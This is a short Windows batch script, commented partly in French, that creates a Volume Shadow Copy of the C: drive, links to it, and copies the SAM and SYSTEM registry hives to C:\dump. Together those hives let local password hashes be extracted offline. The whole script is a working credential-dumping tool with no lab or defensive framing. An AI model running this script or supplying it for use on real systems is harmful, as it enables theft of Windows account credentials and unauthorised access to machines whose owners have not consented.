@echo off
setlocal ENABLEDELAYEDEXPANSION

:: 1. Créer une shadow copy
echo [*] Creating a Shadow Copy...
for /f "tokens=*" %%i in ('vssadmin create shadow /for=C: ^| find "GLOBALROOT"') do (
    set "shadowPath=%%i"
)

set "shadowPath=!shadowPath:*Shadow Copy Volume: =!"
echo [*] Shadow Copy is created : !shadowPath!

:: Creating temp link
set "mount=C:\shadowcopy"
echo [*] Création du lien symbolique...
mklink /d !mount! "!shadowPath!"

:: 3. Directory to save files there
if not exist C:\dump (
    mkdir C:\dump
)

:: 4. Copy the files
echo [*] Copying the files...
copy /Y "!mount!\Windows\System32\config\SAM" C:\dump\SAM >nul
copy /Y "!mount!\Windows\System32\config\SYSTEM" C:\dump\SYSTEM >nul

:: 5. Temp link deletion
echo [*] Deletion of the temp link...
rmdir /S /Q "!mount!"

echo 
pause